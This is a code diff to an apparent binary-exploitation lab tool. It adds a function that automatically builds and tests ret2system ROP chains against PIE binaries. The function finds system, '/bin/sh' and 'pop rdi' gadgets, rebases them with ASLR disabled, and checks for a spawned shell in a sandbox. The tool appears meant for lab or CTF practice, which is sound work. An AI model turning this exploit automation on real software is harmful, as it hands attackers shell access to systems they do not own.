@@ -20,13 +20,16 @@ import secrets
 from pathlib import Path
 
 from pwnable_lab.analyzer.strategy import (
+    binary_exec_range,
     find_ret_gadget,
     is_pie,
+    ret2system_plan,
     ret2win_target,
 )
 from pwnable_lab.elf.parser import parse_elf
 from pwnable_lab.payload.pack import RopStep, build_overflow
 from pwnable_lab.sandbox.runner import (
+    PieBaseResolution,
     SandboxLimits,
     resolve_pie_base,
     verify_payload,
@@ -101,8 +104,116 @@ def auto_ret2win_pie(
     return _report(resolution, win, False, False, "did-not-transfer", None)
 
 
+def auto_ret2system_pie(
+    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
+) -> dict:
+    """PIE 바이너리에 대해 base 를 관측·rebase 하여 ret2system 을 자동 검증한다.
+
+    win 함수가 없는 PIE 라도 ``system`` PLT·``/bin/sh``·``pop rdi`` 가젯이 있으면
+    (:func:`ret2system_plan`) 로드 base 를 로컬 관측해 셋을 rebase 하고, 같은
+    ASLR-off 조건에서 PTY 로 셸을 증명한다(:mod:`sandbox.ret2system` 의 PIE 판).
+    """
+
+    image = parse_elf(Path(binary_path).read_bytes())
+    if (image.bits or 64) != 64:
+        return {"attempted": False, "reason": "pie-amd64-only"}
+    if not is_pie(image):
+        return {"attempted": False, "reason": "not-pie"}
+    plan = ret2system_plan(image)
+    if plan is None:
+        return {"attempted": False, "reason": "no-ret2system-plan"}
+
+    limits = limits or SandboxLimits()
+    resolution = resolve_pie_base(binary_path, limits=limits)
+    if not resolution.confirmed or resolution.base is None:
+        return {
+            "attempted": True,
+            "technique": "ret2system-pie",
+            "succeeded": False,
+            "reason": "pie-base-unresolved",
+            "base_resolution": resolution.as_dict(),
+        }
+
+    base = resolution.base
+    pop_rdi = base + plan["pop_rdi"]
+    binsh = base + plan["binsh"]
+    system = base + plan["system"]
+    ret_off = find_ret_gadget(image)
+    rng = binary_exec_range(image)
+    # 바이너리 실행 범위도 rebase(제어가 libc system 으로 이전됐는지 폴백 판정용).
+    rebased_range = None if rng is None else (base + rng[0], base + rng[1])
+
+    # system 진입 시 movaps 16바이트 정렬이 필요할 수 있어 정렬 변형을 함께 시도.
+    chains: list[tuple[bool, list[int]]] = [(False, [binsh, system])]
+    if ret_off is not None:
+        chains.append((True, [binsh, base + ret_off, system]))
+
+    fallback: tuple[bool, dict] | None = None
+    for alignment, chain in chains:
+        payload = build_overflow(
+            offset, pop_rdi, bits=64, chain=[RopStep(a) for a in chain]
+        )
+        marker = "PWNPILOT_" + secrets.token_hex(4)
+        proof = verify_shell(
+            binary_path, payload, marker=marker, limits=limits, disable_aslr=True
+        )
+        if proof.shell_spawned:
+            return _report_system(
+                resolution, plan, alignment, True, "shell-proven", proof.as_dict()
+            )
+        # 셸이 안 뜨면 최소한 제어가 바이너리 밖(libc system)으로 이전됐는지 확인.
+        if fallback is None:
+            verification = verify_payload(
+                binary_path, payload, limits=limits, disable_aslr=True
+            )
+            rip = verification.observation.rip
+            reached = (
+                rip is not None
+                and rebased_range is not None
+                and not (rebased_range[0] <= rip < rebased_range[1])
+            )
+            if reached:
+                fallback = (alignment, proof.as_dict())
+
+    if fallback is not None:
+        alignment, proof_dict = fallback
+        return _report_system(
+            resolution, plan, alignment, True, "control-into-system", proof_dict
+        )
+    return _report_system(resolution, plan, False, False, "did-not-spawn-shell", None)
+
+
+def _report_system(
+    resolution: PieBaseResolution,
+    plan: dict,
+    alignment: bool,
+    succeeded: bool,
+    reason: str,
+    proof: dict | None,
+) -> dict:
+    base = resolution.base
+    report: dict = {
+        "attempted": True,
+        "technique": "ret2system-pie",
+        "pop_rdi_offset_hex": f"0x{plan['pop_rdi']:x}",
+        "binsh_offset_hex": f"0x{plan['binsh']:x}",
+        "system_offset_hex": f"0x{plan['system']:x}",
+        "base_hex": None if base is None else f"0x{base:x}",
+        "system_runtime_hex": None if base is None else f"0x{base + plan['system']:x}",
+        "alignment_ret_gadget": alignment,
+        "shell_proven": reason == "shell-proven",
+        "succeeded": succeeded,
+        "reason": reason,
+        "aslr": "disabled-for-local-proof",
+        "base_resolution": resolution.as_dict(),
+    }
+    if proof is not None:
+        report["shell_proof"] = proof
+    return report
+
+
 def _report(
-    resolution,
+    resolution: PieBaseResolution,
     win: tuple[str, int],
     alignment: bool,
     succeeded: bool,
